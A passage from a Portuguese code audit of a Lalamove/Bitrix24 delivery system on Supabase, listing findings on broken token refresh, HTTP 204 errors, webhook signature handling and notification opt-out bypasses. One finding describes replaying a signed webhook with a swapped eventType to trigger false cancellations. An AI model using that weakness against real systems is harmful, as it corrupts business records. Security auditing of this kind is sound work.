- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Depois que o token do Bitrix24 vence, a sincronização de pedidos com o CRM para de funcionar e a mensagem que aparece é "erro interno" — ninguém descobre que o problema é a credencial. A tentativa automática de renovar nunca acontece.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts:197-201 (self-call sem Authorization) · :163-164 (`const tokens = await tokenResponse.json();` / `const expiresAt = new Date(Date.now() + tokens.expires_in * 1000).toISOString();`) · :244-247 (`auth: tokenData.access_token`, token lido em :178-181 e nunca recarregado) · /home/user/Lalamove_V2/supabase/config.toml:78-79 (`verify_jwt = true`) · guarda ausente existe em bitrix24-sync/index.ts:112-118 e bitrix24-process-queue/index.ts:119-127
  ```
- **Causa raiz:** (a) O self-call de refresh em `sync_order` não manda `Authorization`, então o `verify_jwt = true` de `config.toml:78-79` responde 401; o resultado nem é lido (`await fetch(...)` sem checar status) e a execução segue usando `tokenData.access_token`, que já havia sido lido ANTES e está expirado. (b) No case `refresh_token`, nada verifica `tokenResponse.ok` nem `tokens.error`: quando o Bitrix recusa o refresh, `tokens.expires_in` é `undefined`, `Date.now() + undefined*1000` é `NaN` e `new Date(NaN).toISOString()` lança `RangeError: Invalid time value`, caindo no catch genérico de :365-371 que devolve `{error: "Internal server error"}` com 500 — a causa real nunca aparece. O padrão correto existe no arquivo irmão: `/home/user/Lalamove_V2/supabase/functions/bitrix24-process-queue/index.ts:119-127` lê `tokens.error` e retorna 400 antes de calcular `expiresAt`.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts`, `/home/user/Lalamove_V2/supabase/functions/bitrix24-process-queue/index.ts`
- **Etapas do plano:** 028

#### A-014 — `cancel` devolve HTTP 204 com corpo JSON: o pedido é cancelado na Lalamove e a tela recebe erro

- **Camada:** Integrações e contratos
- **Severidade:** Alta · **Confiança:** hipotese · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem cancela um pedido vê mensagem de erro e tende a tentar de novo ou a ligar para o suporte, quando o cancelamento já foi feito. Gera retrabalho e desconfiança no sistema justamente na ação mais sensível da operação.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts:206-209 → `if (response.status === 204) { ... return { data: { success: true }, status: 204, rateLimits, attempts: attempt }; }`  ·  /home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts:1200-1206 → `return new Response(JSON.stringify(result), { status: result.status || 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });`  ·  /home/user/Lalamove_V2/docs/LALAMOVE_API_V3.md:86 → `DELETE /v3/orders/3443169998154191792  →  204 No Content`
  ```
- **Causa raiz:** O `DELETE /v3/orders/{id}` da Lalamove responde 204 e o wrapper propaga esse status cru até o `new Response`. Pela especificação WHATWG, 204 é um "null body status" e o construtor de `Response` rejeita um corpo não nulo — o lançamento cai no catch de :1209-1215, que devolve `{error: "Internal server error"}` com 500, DEPOIS de o cancelamento já ter ido para a Lalamove e de `lalamove_orders` já ter sido atualizada em :918-929. O `lalamove-gateway` então vê `!upstream.ok` e repassa erro ao front. Reproduzi o comportamento do construtor em Node (undici): `new Response(JSON.stringify({a:1}), {status:204})` → `TypeError: Response constructor: Invalid response status code 204`.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts`
- **Etapas do plano:** 029
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Não há Deno neste ambiente (`command -v deno` → exit 1), então reproduzi o lançamento em Node/undici e no Bun (o Bun, que é permissivo, aceitou). Falta rodar o construtor no runtime Deno da edge, ou fazer um cancelamento real em produção e ler o status HTTP da resposta.

#### A-028 — Cancelamento de pedido sempre responde erro 500: a resposta e montada com HTTP 204 e corpo JSON, o que o runtime proibe

- **Camada:** Backend — edges Lalamove
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O operador cancela a entrega, ve 'erro interno' na tela e tenta de novo (as tentativas seguintes falham, porque o pedido ja nao existe mais na Lalamove). Na pratica ninguem confia no botao de cancelar, e o time acha que a integracao esta quebrada quando o cancelamento funcionou.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:208-211, :913 (case cancel), :1200-1206 (new Response com result.status), :1207-1213 (catch → 500). Mesmo caminho para change-driver (:1060) e priority-fee quando o upstream responde 204.
  ```
- **Causa raiz:** 204 e um 'null body status' no padrao Fetch (igual a 101/205/304): o construtor Response recusa qualquer corpo. Como a action `cancel` propaga o 204 da Lalamove ate o `new Response(JSON.stringify(result), { status: 204 })`, o construtor lanca TypeError, que cai no catch generico de :1208-1213 e vira `{ error: 'Internal server error' }` com HTTP 500. O cancelamento ja aconteceu na Lalamove nesse ponto — so a resposta mente.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`
- **Etapas do plano:** 066

#### A-029 — O worker horario de renovacao do token UAPI nunca renova nada: depende de um proxy que nao existe e, no caminho de sucesso, nao grava o token novo — so zera o contador de idade

- **Camada:** Backend — edges Lalamove (+ 1 outro(s) local)
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A renovacao automatica do acesso ao portal da Lalamove nunca funcionou: o token morre sozinho a cada 24h e alguem precisa refazer o login na mao. Enquanto isso, carteira, historico de pedidos e cupons ficam indisponiveis no sistema. E o alerta critico dispara de hora em hora sem que haja o que corrigir, treinando o time a ignorar alerta critico — que e como um problema de verdade passa batido.
- **Evidência:**
  ```
  supabase/functions/lalamove-token-refresh/index.ts:151-154 (throw por proxy ausente, alcançado só na janela 20–24 h por causa dos returns de :124-133 e :135-137), :202-205 (UPDATE sem tokens), :120-121 (last_refreshed_at é o relógio); supabase/functions/lalamove-gateway/route.ts:5-9 (secrets do proxy nunca configurados); mitigação: supabase/functions/lalamove-uapi/index.ts:135-151 (auto-refresh em qualquer uso) e :758-784 (action refresh-token sem requireAdmin, UPDATE completo); agendamento em supabase/migrations/20261122140000_fix_crons_dispatcher.sql:125-134.
  ```
  Mesma causa, outro local — Integrações e contratos:
  ```
  supabase/functions/lalamove-token-refresh/index.ts:151-154 e 205-209; supabase/functions/lalamove-gateway/route.ts:4-10 e 104-105; supabase/functions/lalamove-uapi/index.ts:759-784; supabase/migrations/20261122140000_fix_crons_dispatcher.sql:125-137
  ```
- **Causa raiz:** Dois defeitos somados. (a) O worker so sabe renovar via proxy externo, que nunca foi provisionado — entao a cada execucao horaria ele lanca, cai no catch de :208-211, dispara alerta CRITICAL e devolve HTTP 500. (b) Mesmo que o proxy passasse a existir, o UPDATE de sucesso nao persiste os tokens devolvidos (a resposta do proxy nem e lida alem de `text.slice(0,500)`), mas mexe em `last_refreshed_at`, que e justamente a referencia de idade usada em :120-121 `const referenceAt = session.last_refreshed_at ?? session.token_obtained_at`. Ou seja: o relogio volta para zero sem o token ter sido trocado, e os alertas de 'passou de 24h' (:124-133) param de disparar. A propria lalamove-uapi tem o caminho certo e usa a UAPI direto: refreshUapiToken + UPDATE com access_token/refresh_token (lalamove-uapi/index.ts:172-200 e :140-151).
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-gateway/route.ts`, `/home/user/Lalamove_V2/supabase/functions/lalamove-token-refresh/index.ts`, `/home/user/Lalamove_V2/supabase/functions/lalamove-uapi/index.ts`, `supabase/functions/lalamove-gateway/route.ts`, `supabase/functions/lalamove-token-refresh/index.ts`, `supabase/functions/lalamove-uapi/index.ts`
- **Etapas do plano:** 067

#### A-030 — Pedido concluido ou cancelado pela Lalamove nao fecha o ciclo: os handlers que incrementam entregas e avisam o time respondem a eventos que a v3 nao envia

- **Camada:** Backend — edges Lalamove
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Dois efeitos que o dono sente: (1) o score de risco dos motoristas trabalha sempre com zero entregas concluidas, entao todo motorista permanece como alto risco e cai na fila de aprovacao manual, travando operacao; (2) quando a Lalamove cancela uma entrega, ninguem e avisado e o motivo do cancelamento nao fica registrado — o time descobre pelo cliente.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:525-537 (case genérico, `break` em :536); efeitos órfãos em :539-549, :551-576 e :578-597 — note que o case de cancelamento começa em :578-579 com os dois rótulos ORDER_CANCELLED e ORDER_CANCELED, não em :589; mapa em :108-117; `event: p.eventType` em supabase/functions/lalamove-webhook/normalize.ts:63-64.
  ```
- **Causa raiz:** O handler nasceu para um contrato interno com um evento por transicao (ORDER_COMPLETED, ORDER_CANCELLED, ORDER_PICKED_UP) e a v3 oficial entrega tudo como ORDER_STATUS_CHANGED com o status dentro de data.order.status. A normalizacao v3 foi adicionada (normalize.ts) mas mapeia `event: p.eventType` sem desdobrar o status em um evento interno, entao os cases especificos viraram codigo morto para o trafego real e o case generico so grava status + historico. Consequencias concretas: contadores de entrega do motorista nunca sobem; `lalamove_stops.completed_at` nunca e marcado (estava no case ORDER_PICKED_UP, :545); o motivo do cancelamento, que a normalizacao ate copia para `data.reason` (normalize.ts:59-61), e ignorado; e nenhuma notificacao de cancelamento sai.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`, `supabase/functions/lalamove-webhook/normalize.ts`
- **Etapas do plano:** 068

#### A-034 — Fallback de geocodificação do pedido nunca funciona: lê `json.data[0]` mas o geo-gateway devolve array puro — e os 12 testes do módulo mockam o formato errado

- **Camada:** Integrações e contratos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Todo pedido que entra sem coordenada (Bitrix24, importação da UAPI, n8n) fica sem ponto no mapa e sem cálculo de distância/ETA, e nunca é marcado para revisão de endereço — exatamente o problema que a etapa 37 dizia ter resolvido. Ninguém percebe porque os testes estão verdes.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/lalamove-api/geocode-fallback.ts:80 → `const hit = json.data?.[0];` · :81 → `if (!hit?.location) return null;` · /home/user/Lalamove_V2/supabase/functions/geo-gateway/index.ts:336 → `return jsonResponse(result.data, 200, headers, version);` · /home/user/Lalamove_V2/supabase/functions/_shared/contract.ts:266 → `return new Response(JSON.stringify(body), { status, headers: finalHeaders });` · /home/user/Lalamove_V2/supabase/functions/geo-gateway/providers/types.ts:271 → `geocode(req: GeocodeReq): Promise<ProviderResult<GeoAddress[]>>;` · /home/user/Lalamove_V2/supabase/functions/lalamove-api/geocode-fallback.test.ts:12 → `const hit = (over: Record<string, unknown> = {}) => ({` (o envelope `data: [...]` está na linha 13, não em 16-17 como o auditor citou)
  ```
- **Causa raiz:** O `geo-gateway` serializa `result.data` direto no corpo (array de `GeoAddress`), sem envelope. O `geocode-fallback.ts` espera um envelope `{ data: [...] }`. Como `Array.prototype.data` não existe, `json.data?.[0]` é sempre `undefined`, `if (!hit?.location) return null` dispara e `geocodeAddress` devolve `null` em 100% dos casos. Os testes passam porque o mock constrói o envelope que a produção não tem — o teste valida o parser contra si mesmo, não contra o gateway. Prova de que o formato real é array puro: `/home/user/Lalamove_V2/supabase/functions/job-worker/index.ts:453` faz `const best = Array.isArray(data) ? data[0] : data;` e `/home/user/Lalamove_V2/src/hooks/useGeo.ts:141` declara `callGeo<GeoAddress[]>({ action: "geocode" })`.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-api/geocode-fallback.ts`, `/home/user/Lalamove_V2/supabase/functions/lalamove-api/geocode-fallback.test.ts`, `/home/user/Lalamove_V2/supabase/functions/geo-gateway/index.ts`
- **Etapas do plano:** 072

#### A-057 — A matriz de special requests da edge divergiu do catálogo oficial: todo extra pago escolhido na tela é descartado em silêncio antes da cotação

- **Camada:** Integrações e contratos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quando o cliente escolhe caminhão, van, Fiorino ou carro e marca extras pagos (bolsa térmica, tempo de espera, ajudante de carga, viagem de volta), a cotação sai SEM esses extras: o preço fica errado e o motorista chega sem o combinado. Em motos e nos serviços LALAGO/LALAPRO os mesmos extras passam normalmente — a tela mente sobre o que foi pedido, dependendo do veículo.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts:302-310 (matriz da edge; `CAR: ['HELP_BUY','TOLL_FEE','ROUND_TRIP','DOOR_TO_DOOR']`) · :312-326 (`sanitizeSpecialRequests`, `const allowed = SPECIAL_REQUESTS_BY_SERVICE[serviceType];` e `if (!allowed) return { clean: requested, dropped: [] };`) · :329-334 (só `console.warn`) · src/lib/lalamoveCatalog.ts:141-149 · src/components/orders/NewOrderDialog.tsx:22, :246, :302-316 · src/types/lalamove.ts:18-33 · docs/LALAMOVE_API_V3.md:253-283
  ```
- **Causa raiz:** Há duas matrizes de compatibilidade e elas não têm um único código em comum. A da edge usa serviceTypes que não existem no catálogo BR (`MOTORCYCLE`, `MPV`, `TRUCK175`) e códigos que não existem na matriz oficial (`HELP_BUY`, `TOLL_FEE`, `ROUND_TRIP`, `DOOR_TO_DOOR`, `MOVING_SERVICE`, `LOADING_SERVICE`). O front oferece os códigos de `lalamoveCatalog.ts:141` (`NewOrderDialog.tsx:246`) e os envia em `specialRequests` (`NewOrderDialog.tsx:316`). Em `sanitizeSpecialRequests` (:313-326), para `CAR`, `VAN`, `UV_FIORINO` e `TRUCK330` a chave EXISTE na matriz da edge, então tudo o que o operador marcou cai em `dropped` e sai do corpo — com apenas um `console.warn` (:330-334). Para `LALAGO`, `LALAPRO`, `HATCHBACK` etc. a chave não existe e o comentário `// Serviço desconhecido: repassa tal qual` deixa passar. Resultado: o comportamento depende do veículo, e o comentário "mantida em sincronia" é falso.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts`, `/home/user/Lalamove_V2/src/lib/lalamoveCatalog.ts`, `/home/user/Lalamove_V2/src/components/orders/NewOrderDialog.tsx`, `/home/user/Lalamove_V2/src/types/lalamove.ts`
- **Etapas do plano:** 142

#### M-010 — llm-wh: o proxy de webhook quebra a assinatura v3 da Lalamove — todo evento repassado por ele é recusado com 401

- **Camada:** Backend — demais edges
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Se o endereço curto for o cadastrado na Lalamove, nenhuma atualização de pedido (motorista atribuído, coleta, entrega, comprovante) entra no sistema: os painéis ficam congelados no último status e a tabela de eventos só acumula registros de assinatura inválida.
- **Evidência:**
  ```
  supabase/functions/llm-wh/index.ts:73-80 — `const response = await fetch(\`${SUPABASE_URL}/functions/v1/lalamove-webhook\`, { method: req.method, headers: forwardHeaders, body: rawBody || undefined });`. supabase/functions/lalamove-webhook/index.ts:198 — `const webhookPaths = ['/functions/v1/lalamove-webhook', new URL(req.url).pathname];`. supabase/functions/lalamove-webhook/security.ts:82-90 — `for (const path of [...new Set(paths)]) { const raw = \`${timestamp}\r\nPOST\r\n${path}\r\n\r\n${body}\`; ... } return { valid: false, reason: 'Signature mismatch (v3 body)' };`. Condição de ativação não comprovada no repo: supabase/functions/lalamove-api/index.ts:1133 — `const webhookPath = '/functions/v1/lalamove-webhook';` (o self-test e a assinatura de teste usam o caminho direto, não o do proxy).
  ```
- **Causa raiz:** A assinatura v3 da Lalamove inclui o caminho da URL registrada no texto que é assinado (`${timestamp}\r\nPOST\r\n${path}\r\n\r\n${data}`). Se a URL cadastrada na Lalamove é `/functions/v1/llm-wh`, a assinatura que chega foi calculada com esse caminho. O llm-wh repassa o corpo cru para `/functions/v1/lalamove-webhook`, e lá os dois únicos caminhos candidatos testados são a constante `/functions/v1/lalamove-webhook` e o `pathname` da própria request repassada — nenhum dos dois é `/functions/v1/llm-wh`. O laço de `validateLalamoveV3Signature` esgota os candidatos e devolve `valid: false`, e o webhook responde 401 e grava `SIGNATURE_INVALID` em `webhook_events`. O proxy existe justamente para ser a URL registrada, então o caminho pelo qual ele serve é o único que não é aceito.
- **Arquivos:** `supabase/functions/llm-wh/index.ts`, `supabase/functions/lalamove-webhook/index.ts`, `supabase/functions/lalamove-webhook/security.ts`
- **Etapas do plano:** 048

#### M-011 — O campo que decide o efeito colateral do webhook (eventType) fica de fora da assinatura HMAC, e a checagem de frescor e opcional

- **Camada:** Backend — edges Lalamove
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Quem conseguir ver uma unica chamada legitima da Lalamove (log exportado, proxy, print de suporte) consegue fazer o sistema executar outro evento: cancelar pedido no banco, criar motorista, marcar prova de entrega. O estrago e no registro interno, nao na Lalamove — mas e o registro interno que o time usa para decidir.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/security.ts:80-84 (raw assinado sem eventType) · normalize.ts:31-35 (timestamp vira null se p.timestamp for string) · normalize.ts:64 (`event: p.eventType`) · index.ts:124-125 (frescor pulado sem timestamp) · index.ts:253 (switch pelo eventType) · index.ts:275 (idempotencia = hash do corpo inteiro)
  ```
- **Causa raiz:** A formula oficial da v3 assina apenas o bloco `data`; a implementacao aceita isso (correto) mas depois confia em `eventType`, `eventId` e `apiKey`, que o atacante pode trocar sem invalidar a assinatura. Como o eventType escolhe o case do switch, um corpo legitimamente assinado pode ser reapresentado com o evento trocado (por exemplo DRIVER_ASSIGNED -> ORDER_CANCELLED) e passa pelos tres gates: a assinatura continua valida, o hash de idempotencia muda junto com o corpo (index.ts:275, hash do corpo inteiro) e o frescor e pulado quando `data.updatedAt` nao existe e o timestamp do topo veio como string. O security.test.ts cobre bem a assinatura em si, mas nenhum teste cobre 'eventType trocado com assinatura valida'.
- **Arquivos:** `supabase/functions/lalamove-webhook/security.ts`, `supabase/functions/lalamove-webhook/normalize.ts`, `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 049

#### M-037 — O health check da Lalamove chama endpoint e autenticação que não existem no contrato v3 — resultado é sempre "degraded"

- **Camada:** Integrações e contratos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O painel de saúde das integrações mostra a Lalamove permanentemente com defeito. Quando a Lalamove realmente cair, nada muda na tela — a operação perde o aviso que justifica o painel. Como bônus, a chave da API é enviada como Bearer para uma rota inexistente a cada checagem.
- **Evidência:**
  ```
  supabase/functions/check-external-api/index.ts:126-145 (ping + Bearer + else sempre degraded); supabase/functions/lalamove-api/index.ts:124 (hmac); docs/LALAMOVE_API_V3.md:186 (cities; sem /v3/ping no doc)
  ```
- **Causa raiz:** Dois desvios do contrato v3 no mesmo fetch: (1) `/v3/ping` não é um endpoint da API v3 — o doc auditado em produção lista cities, quotations, orders, priority-fee, drivers e webhook, e o próprio repo usa `cities` como sonda de saúde (`/home/user/Lalamove_V2/supabase/functions/lalamove-gateway/route.ts:73-75`: `case 'status': case 'test': return { fn: 'lalamove-api', action: 'cities' }`); (2) a v3 autentica com `hmac <key>:<timestamp>:<signature>`, não com `Bearer <key>`. Qualquer um dos dois já garante um 4xx permanente, então `response.ok` nunca é verdadeiro e o else de :141-145 devolve `status: 'degraded', message: "API returned 404"`. O comentário do código (`// Ping endpoint (ou endpoint de health se existir)`) admite que o endpoint foi suposto, não verificado.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/check-external-api/index.ts`, `/home/user/Lalamove_V2/src/hooks/healthChecks.ts`, `/home/user/Lalamove_V2/docs/LALAMOVE_API_V3.md`
- **Etapas do plano:** 116

#### M-142 — O retorno do OAuth do Bitrix24 é impossível: a URL de redirect aponta para uma edge com `verify_jwt = true`

- **Camada:** Integrações e contratos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A integração com o Bitrix24 não pode ser ligada: a tela de conexão abre a janela de autorização, o usuário autoriza e volta para uma página de erro. Nenhum pedido sincroniza com o CRM, nenhuma atividade é registrada no negócio.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts:78 → `const redirectUri = \`${supabaseUrl}/functions/v1/bitrix24-sync?action=oauth_callback\`;` · :37-39 (comentário que assume GET sem JWT) · /home/user/Lalamove_V2/supabase/config.toml:76-79 → `# bitrix24-sync: ... Chamado por functions internas/n8n com Bearer service_role.` / `[functions.bitrix24-sync]` / `verify_jwt = true` · /home/user/Lalamove_V2/src/hooks/useBitrix24.ts:107 → `body: { action: "get_auth_url", domain },`
  ```
- **Causa raiz:** O Bitrix24 devolve o usuário com um redirect de navegador (GET, sem header `Authorization`). Com `verify_jwt = true` o gateway do Supabase responde 401 antes de o código da função rodar, então `oauth_callback` nunca executa, `bitrix24_tokens` nunca é populada e todas as outras ações caem em "Bitrix24 not connected" (:184-189, :307-312). O comentário do `config.toml` justifica o `verify_jwt` dizendo que a função é chamada "por functions internas/n8n" — ignora que ela também é o endpoint público de retorno do OAuth.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/config.toml`, `/home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts`, `/home/user/Lalamove_V2/src/hooks/useBitrix24.ts`
- **Etapas do plano:** 280

#### B-023 — Telemetria de quota da Lalamove lê o header sem o sufixo de endpoint: `lalamove_rate_limits` sempre nulo e o alerta de quota crítica nunca dispara

- **Camada:** Integrações e contratos
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A empresa não sabe quanto da cota da Lalamove já gastou: o painel de quota mostra campos vazios e o aviso de "quota acabando" nunca chega. Quando a cota estourar, cotações e pedidos começam a falhar com 429 sem nenhum aviso prévio.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts:50-52 → `const limitTotal = Number(headers['ratelimits-limit']); const limitRemaining = Number(headers['ratelimits-remaining']); const resetRaw = headers['ratelimits-reset'];`  ·  mesma função, :82 → `if (Number.isFinite(limitRemaining) && limitRemaining <= 10) {`  ·  coleta: :183-186 → `if (key.startsWith('ratelimits-')) rateLimits[key] = value;`
  ```
- **Causa raiz:** O `rateLimits` coletado em :197-200 guarda as chaves cruas (`ratelimits-limit-getcities`, etc.), mas `persistRateLimit` procura as chaves exatas sem sufixo. Nenhuma casa, então `Number(undefined)` é `NaN`, `limit_total`/`limit_remaining`/`usage_ratio` são gravados como `null`, e a guarda de :82-84 (`if (Number.isFinite(limitRemaining) && limitRemaining <= 10)`) nunca é verdadeira — o aviso de quota crítica é código morto. O gateway, no mesmo repo, trata o sufixo corretamente, o que confirma qual é o formato real. Isto já está catalogado como item B23 em `/home/user/Lalamove_V2/docs/ANALISE_EXAUSTIVA_E_PLANO_INTEGRACAO_2026-11-21.md:258` e como ação 2.8 em :340 — ainda não foi feito.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts`, `/home/user/Lalamove_V2/docs/ANALISE_EXAUSTIVA_E_PLANO_INTEGRACAO_2026-11-21.md`
- **Etapas do plano:** 205


## Causa raiz: As regras de envio de mensagem ficaram espalhadas por cada caminho, em vez de um único ponto de saída

O sistema manda mensagem ao motorista e ao fornecedor por vários caminhos (alerta configurado, aviso avulso, escalonamento, canal de contingência, SMS de reserva) e cada caminho recebeu a sua própria cópia das regras. Resultado: quem pediu para não receber mais mensagem continua recebendo pelo caminho de contingência; o telefone só é padronizado em um dos caminhos, então a mesma pessoa conta como duas; o teto de seis mensagens por dez minutos não filtra por destinatário; o aviso ao fornecedor é reemitido a cada nova parada do veículo, sem limite por pedido; e no horário de silêncio a mensagem é reagendada perdendo os destinatários. É risco de incomodar o motorista em excesso e de desrespeitar o pedido de descadastramento.

**9 achado(s) sob esta causa.**


#### A-031 — Telefone vindo de alert_configurations é enviado sem normalização — só o caminho ad-hoc normaliza

- **Camada:** Backend — notificação e fila
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Alerta configurado pelo operador na tela de configurações pode não chegar: o número sai sem o código do país e o WhatsApp/SMS entrega para o destinatário errado ou devolve erro. O mesmo contato cadastrado pelo pedido recebe normal, então o problema parece intermitente e ninguém desconfia do cadastro.
- **Evidência:**
  ```
  supabase/functions/send-notification/index.ts:843-846 `const comparable = (channel === "whatsapp" || channel === "sms") ? (normalizePhone(destination) ?? destination) : destination;` · :878-883 `const r = await dispatch( channel, destination, effectiveMessage, "config", );` · contraste em :704-707 `destination = normalized;` · src/pages/alert-configurations/AlertConfigCard.tsx:106 `whatsapp_numbers: editedWhatsapp ? editedWhatsapp.split(',').map(s => s.trim()) : null` · supabase/functions/_shared/channels/zapp.ts:104-105 `return (number ?? "").replace(/\D/g, "");`
  ```
- **Causa raiz:** Em `dispatchIfNew` o `normalizePhone` só é usado para montar a chave de dedup (`comparable`) e para a consulta de opt-out (`optedPhone`, linha 862). O valor passado ao `dispatch` nunca é reatribuído. A jusante, `sendWhatsApp` (index.ts:1161 `number.replace(/\D/g, "")`) e `normalizeSmsNumber` (supabase/functions/_shared/channels/sms.ts:101-103) apenas tiram os não-dígitos: não acrescentam o DDI 55 nem tiram o `0` de discagem. `(41) 99999-8888` cadastrado na UI sai como `41999998888`.
- **Arquivos:** `supabase/functions/send-notification/index.ts`, `supabase/functions/_shared/channels/sms.ts`, `supabase/functions/_shared/phone.ts`
- **Etapas do plano:** 069

#### M-081 — Opt-out é furado pelo canal de contingência e pelo fallback imediato de SMS

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem pediu para parar de receber mensagens continua recebendo pelo canal de contingência. Além do incômodo, é exposição de LGPD: existe registro do pedido de descadastro no banco e o sistema envia de todo jeito. E SMS que o operador desligou continua sendo cobrado.
- **Evidência:**
  ```
  supabase/functions/send-notification/index.ts:318-344 (`dispatch` começa em `if (channel === "whatsapp" || channel === "sms") { if (await isDriverRateLimited(recipient)) {` e não há `isPhoneOptedOut`) · :955-959 `for (const recipient of fallbackRecipients) { await dispatch(cfg.fallback_channel, recipient, effectiveMessage); }` · proteção que REFUTA a parte do SMS imediato: supabase/migrations/20261123200000_optout_and_tracking_end.sql:57-67 `is_phone_opted_out(p_phone text)` — opt-out por telefone, sem canal, já consultado em index.ts:708 e :863 antes de qualquer `dispatch("whatsapp", ...)`
  ```
- **Causa raiz:** A checagem de opt-out está duplicada nos dois laços de destinatário (index.ts:708 e index.ts:861-874) em vez de ficar no ponto único de saída (`dispatch`). Todo caminho que chama `dispatch`/`sendSms` por fora desses laços — `fallback_channel` e o fallback imediato por SMS — escapa. O fallback imediato também ignora `isChannelDisabled("sms")`, então SMS desligado pelo operador volta a custar.
- **Arquivos:** `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 174

#### M-104 — Aviso automático ao fornecedor é reemitido a cada novo alerta de parada, sem teto por pedido

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Numa entrega com trânsito, o fornecedor pode receber um aviso de atraso a cada 5 minutos pelo mesmo pedido — até 12 por hora. Mensagem paga e, pior, fornecedor irritado com aviso repetido sobre algo que ele não controla.
- **Evidência:**
  ```
  supabase/functions/check-driver-alerts/index.ts:159-191 (invoke só em alerta novo) + :260-262 (auto-dismiss libera recriação) + :21 (limiar padrão 5 min); supabase/migrations/20261123190000_cron_check_driver_alerts.sql:40 (cron */2); send-notification/index.ts:181 (janela de 300 s) e :640-644 (teto por motorista não alcança o fornecedor). Ressalva não vista pelo auditor: `is_stopped`/`stopped_since` só são escritos por supabase/functions/simulate-driver-movement/index.ts:157-158 e :227-229; nenhuma migration os preenche (colunas criadas em supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:198-199).
  ```
- **Causa raiz:** O aviso dispara quando um alerta DRIVER_STOPPED **novo** é criado, e a dispensa automática de :261-263 apaga o alerta existente assim que o motorista volta a se mover. Motorista em trânsito pesado oscila parado/andando, e cada oscilação recria o alerta e dispara um novo aviso. O único freio é o dedup de `claim_alert_notification` com janela fixa de 300 s (send-notification/index.ts:181 `p_window_seconds: 300`), e o fornecedor não é o motorista, então o teto de 6/10min de `isDriverRateLimited` não se aplica (index.ts:641-644 exige que o destino case com o telefone do motorista).
- **Arquivos:** `supabase/functions/check-driver-alerts/index.ts`, `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 220

#### M-105 — Teto de 6 mensagens/10min por motorista lê alerts_sent sem filtro por destinatário nem limite

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Em horário de pico o limite de mensagens por motorista pode deixar de valer e o motorista leva uma rajada de avisos — exatamente o que o limite existe para evitar. E cada envio puxa toda a tabela de envios dos últimos 10 minutos, deixando o disparo mais lento quanto mais movimento tem.
- **Evidência:**
  ```
